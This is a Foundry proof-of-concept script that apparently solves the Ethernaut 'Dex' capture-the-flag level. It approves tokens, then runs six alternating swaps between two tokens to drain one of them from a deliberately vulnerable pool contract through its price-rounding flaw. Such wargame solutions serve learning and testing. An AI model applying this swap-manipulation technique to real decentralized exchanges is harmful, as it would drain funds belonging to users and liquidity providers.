// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Script, console2} from "forge-std/Script.sol";

interface IDex {
    function token1() external view returns (address);

    function token2() external view returns (address);

    function approve(address spender, uint256 amount) external;

    function balanceOf(
        address token,
        address account
    ) external view returns (uint256);

    function swap(address from, address to, uint amount) external;
}

contract PoC is Script {
    IDex level22 = IDex(0x84c765cfdbA36b9e81Db0eb7C9356eed77296ed6);

    function run() external {
        uint256 deployer = vm.envUint("PRIVATE_KEY");

        vm.startBroadcast(deployer);
        level22.approve(address(level22), 500);
        address token1 = level22.token1();
        address token2 = level22.token2();

        level22.swap(token1, token2, 10);
        level22.swap(token2, token1, 20);
        level22.swap(token1, token2, 24);
        level22.swap(token2, token1, 30);
        level22.swap(token1, token2, 41);
        level22.swap(token2, token1, 45);

        console2.log(
            "Final token1 balance of Dex is : ",
            level22.balanceOf(token1, address(level22))
        );
        vm.stopBroadcast();
    }
}
